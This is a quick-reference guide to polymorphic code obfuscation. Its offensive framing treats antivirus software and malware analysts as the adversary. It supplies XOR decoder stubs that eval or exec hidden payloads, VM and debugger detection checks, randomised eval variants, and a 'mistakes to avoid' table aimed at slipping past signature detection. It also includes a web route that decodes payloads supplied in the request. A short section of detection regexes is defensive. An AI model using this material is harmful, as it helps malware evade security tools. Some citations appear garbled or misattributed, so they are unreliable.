# Polymorphic Obfuscation: Quick Reference Guide

## Technique Matrix

### Encoding Methods

| Method | Reversibility | Performance | Detection Difficulty | Code Overhead |
|--------|--------------|-------------|---------------------|----------------|
| XOR | Symmetric | Excellent | Low | Minimal |
| ADD/SUB | Symmetric | Excellent | Low | Minimal |
| ROR/ROL | Symmetric | Excellent | Low | Minimal |
| RC4 | Symmetric | Good | Medium | Low |
| AES | Symmetric | Fair | High | Low |
| Base64 | Symmetric | Good | Low | High |
| Substitution | Symmetric | Good | Low | Medium |
| Transposition | Symmetric | Good | Low | Medium |

### Mutation Strategies

| Strategy | Complexity | Effectiveness | Implementation Time |
|----------|-----------|----------------|-------------------|
| Register Swapping | Low | Low | 1 hour |
| Instruction Substitution | Medium | Medium | 2-4 hours |
| Jump Table Modification | Medium | Medium | 3-6 hours |
| Dead Code Injection | Low | Low-Medium | 1-2 hours |
| Control Flow Flattening | High | High | 4-8 hours |
| Variable Renaming | Low | Low-Medium | 1-2 hours |
| String Encoding | Low-Medium | Medium | 2-3 hours |
| API Hooking Replacement | High | High | 6-12 hours |

---

## Code Snippet Library

### Quick XOR Encoder

```javascript
// One-liner XOR encoder
const xorEncode = (s, k) => s.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ k.charCodeAt(i % k.length))).join('');

// Usage
const encoded = xorEncode('secretData', 'myKey');
const decoded = xorEncode(encoded, 'myKey');  // XOR is symmetric
```

### Polymorphic Decoder Template

```javascript
(function() {
    const payload = '%ENCRYPTED_DATA%';
    const key = %KEY%;
    const decoded = payload.split('').map((c, i) => 
        String.fromCharCode(c.charCodeAt(0) ^ ((key >> (8 * (i % 4))) & 0xFF))
    ).join('');
    eval(decoded);
})();
```

### Self-Decoding Function

```python
def self_decode():
    """Polymorphic function that decodes and executes itself"""
    import base64
    
    # Variant 1: XOR decoding
    encrypted = b'\x00\x01\x02...'
    key = 42
    decrypted = bytes([b ^ key for b in encrypted])
    exec(decrypted)
    
    # Variant 2: Base64 decoding
    encrypted = 'aGVsbG8gd29ybGQ='
    decrypted = base64.b64decode(encrypted).decode()
    exec(decrypted)
```

---

## Polymorphic Detection Signatures

### High-Confidence Indicators

```regex
# Dynamic execution patterns
eval\s*\(\s*["\']
Function\s*\(\s*["\']
exec\s*\(.*\)
compile\s*\(

# String decoding patterns
String\.fromCharCode\s*\(\s*\.\.\.
chr\s*\(\s*\d+\s*\)
bytes\.fromhex
base64\.b64decode

# Encoder signatures
\.split\s*\(\s*["\']'\s*\).*\.join
charCodeAt|ord\s*\(
>>|<<|&|\^  (excessive bitwise operations in loops)

# Suspicious variable patterns
_+[a-z0-9]{8,}
__\w+__
[a-z0-9]{32,}  (long hex-like strings)
```

### Medium-Confidence Indicators

```regex
# Control flow flattening
while\s*\(\s*true\s*\)
switch\s*\(\s*\w+\s*\).*case\s*\d+:
state\s*=\s*\d+

# Junk code patterns
Math\.random\s*\(\)
void\s*\(
if\s*\(\s*Math\.\w+.*>.*0\s*\)

# Runtime modifications
Object\.defineProperty
Proxy\s*=
Symbol\s*\(
```

---

## Evasion Techniques Summary

### Anti-Sandbox

```javascript
// Detect Cuckoo Sandbox
if (navigator.userAgent.includes('VirtualBox')) throw new Error('VM detected');

// Detect timing anomalies (debugging)
const start = performance.now();
debugger;
if (performance.now() - start > 100) throw new Error('Debugger detected');

// Detect analysis environment
const artifacts = ['/opt/cuckoo', '/analysis', 'C:\\detector'];
// Check for their existence
```

### API Obfuscation

```javascript
// Instead of: eval(code);
// Use polymorphic variant:
const executeVariant = [
    code => eval(code),
    code => Function(code)(),
    code => (1, eval)(code),  // Indirect eval
    code => window['eval'](code),  // Property access
][Math.floor(Math.random() * 4)];
```

### Timing Jitter

```python
import time
import random

# Add random delays
def jittered_sleep():
    delay = random.gauss(5, 2)  # Normal distribution
    time.sleep(max(0, delay))

# Busy-wait variant
def busy_wait(seconds):
    end = time.time() + seconds
    while time.time() < end:
        _ = sum(range(1000))  # Burn CPU cycles
```

---

## Performance Optimization Patterns

### Lazy Decoding

```javascript
// Don't decode everything at once
const lazyDecode = (encrypted, key) => {
    return new Proxy(new Uint8Array(encrypted), {
        get: (target, prop) => {
            if (typeof prop === 'string' && /^\d+$/.test(prop)) {
                return target[prop] ^ (key >> (8 * (prop % 4)) & 0xFF);
            }
            return target[prop];
        }
    });
};
```

### Caching Decoded Payloads

```javascript
const decoderCache = new Map();

function getCachedDecoded(encryptedData, key) {
    const cacheKey = `${encryptedData.toString()}_${key}`;
    
    if (!decoderCache.has(cacheKey)) {
        decoderCache.set(cacheKey, decode(encryptedData, key));
    }
    
    return decoderCache.get(cacheKey);
}
```

### Batch Processing

```python
def batch_decrypt(payloads, key, batch_size=100):
    """Process multiple payloads efficiently"""
    results = []
    
    for i in range(0, len(payloads), batch_size):
        batch = payloads[i:i+batch_size]
        
        # Use vectorized operations if available
        decrypted = [decrypt_single(p, key) for p in batch]
        results.extend(decrypted)
    
    return results
```

---

## Common Mistakes to Avoid

| Mistake | Impact | Solution |
|---------|--------|----------|
| Static decoder stub | Easy detection | Vary stub for each generation |
| Predictable key generation | Key recovery | Use entropy source or time-based |
| Naive variable renaming | Pattern detection | Use diverse naming schemes |
| Same mutation every time | Signature bypass fails | Randomize mutations |
| No entropy checks | Analysis reveals patterns | Use actual randomness |
| Obvious string patterns | Keyword detection | Fragment and encode strings |
| Timing too consistent | Debugger detection fails | Add jitter and variance |
| Same encryption method | Signature-based detection | Rotate algorithms per variant |

---

## Testing & Validation Checklist

- [ ] Each generation produces unique output (verify hex dumps differ)
- [ ] Decoder correctly restores original payload (bit-for-bit match)
- [ ] Performance acceptable (encode/decode time under threshold)
- [ ] No hardcoded strings in decoder stub
- [ ] Random number generator properly seeded
- [ ] Entropy analysis shows high randomness for encrypted data
- [ ] No distinguishing patterns in multiple samples
- [ ] Works in target environment (browser, OS, runtime)
- [ ] Payload size acceptable (no excessive bloat)
- [ ] Backward compatibility maintained (if needed)

---

## Threat Model Analysis

### Attack Scenarios

**Scenario 1: Signature-Based Detection**
- Attacker: Antivirus using file signatures
- Defense: Polymorphic encoding (each file unique)
- Effectiveness: High

**Scenario 2: Static Analysis**
- Attacker: Malware analyst using decompiler
- Defense: Code obfuscation + control flow flattening
- Effectiveness: Medium-High

**Scenario 3: Dynamic Analysis**
- Attacker: Sandbox/debugger monitoring
- Defense: VM detection + timing jitter + behavior mimicry
- Effectiveness: Medium

**Scenario 4: Memory Forensics**
- Attacker: Memory dump analysis
- Defense: Self-modifying code + encrypted memory
- Effectiveness: Medium

**Scenario 5: Heuristic Detection**
- Attacker: Behavioral analysis + entropy checks
- Defense: Legitimate operations mimicry + entropy management
- Effectiveness: Low-Medium

---

## Advanced Techniques Reference

### Metamorphic Engine Components

```
Mutation Engine
├── Instruction Generator
│   ├── x86/x64 opcodes
│   ├── ARM instructions
│   └── Custom bytecode
├── Register Allocator
│   ├── Conflict detection
│   ├── Register pressure
│   └── Spill code generation
└── Code Optimizer
    ├── Dead code elimination
    ├── Constant folding
    └── Instruction scheduling

Encoding Engine
├── Cipher Suite
│   ├── Stream ciphers (RC4, ChaCha20)
│   ├── Block ciphers (AES, Camellia)
│   └── Custom ciphers
├── Key Derivation
│   ├── PBKDF2
│   ├── Argon2
│   └── Time-based generation
└── Payload Formatter
    ├── Envelope format
    ├── Checksum/MAC
    └── Metadata

Detection Evasion
├── Anti-Analysis
│   ├── VM detection
│   ├── Debugger detection
│   ├── Sandbox detection
│   └── Timing analysis
├── API Abstraction
│   ├── Indirect calls
│   ├── Syscall wrapping
│   └── API hooking bypass
└── Behavioral Hiding
    ├── Legitimate operations mimicry
    ├── Timing jitter
    └── Memory pattern randomization
```

---

## Resource Requirements

### Encoding Complexity Comparison

| Technique | CPU Load | Memory | Time | Scalability |
|-----------|----------|--------|------|-------------|
| Simple XOR | 1-5% | <1MB | <10ms | Excellent |
| Multi-layer | 10-20% | 1-5MB | 50-200ms | Good |
| AES | 50-100% | 2-10MB | 100-500ms | Fair |
| Control Flow Flattening | 100%+ | 10-50MB | 500-2000ms | Poor |

---

## Integration Points

### Framework Integration

```python
# Django/Flask integration
@app.route('/load_payload')
def load_payload():
    payload = request.args.get('p')
    decoder = PolymorphicDecoder()
    return decoder.decode(payload)

# SQLAlchemy ORM integration
class PolymorphicPayload(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    encrypted_data = db.Column(db.LargeBinary)
    cipher_variant = db.Column(db.Integer)
    encryption_key = db.Column(db.String(256))
    
    def execute(self):
        decoder = PolymorphicDecoder(self.cipher_variant)
        return decoder.decode(self.encrypted_data, self.encryption_key)
```

---

## References & Further Reading

### Academic Papers
- "Polymorphic Worms and Viruses" (Venkataraman et al.)
- "Metamorphic Code Generation" (Sz´kely & Butty´an)
- "Code Obfuscation Survey" (Collberg et al.)

### Standards & Specs
- NIST SP 800-188: Adversarial Machine Learning
- OWASP: Code Obfuscation Cheat Sheet
- CWE-656: Reliance on Security Through Obscurity

### Tools & Resources
- UPX (Ultimate Packer for eXecutables)
- Metasploit (MSFencode/Veil)
- JavaScript beautifiers & deobfuscators
- IDA Pro / Ghidra for reverse engineering

---

## Glossary

- **Decoder Stub**: Variable portion of polymorphic code responsible for decryption
- **Encryption Key**: Used to encode payload; may be derived, embedded, or time-based
- **Polymorphic Engine**: Generator creating unique instances while maintaining semantics
- **Mutation Vector**: Specific transformation technique applied to code/data
- **Variant**: Individual unique instance produced by polymorphic generator
- **Payload**: Actual functional code being protected/obfuscated
- **Metamorphic**: Code that changes structure; polymorphic changes encoding
- **Junk Code**: Non-functional instructions inserted for obfuscation
- **Dead Code**: Unreachable code paths serving no purpose
- **Control Flow Flattening**: Converting branching into state machine
- **Entropy**: Measure of randomness/unpredictability in data

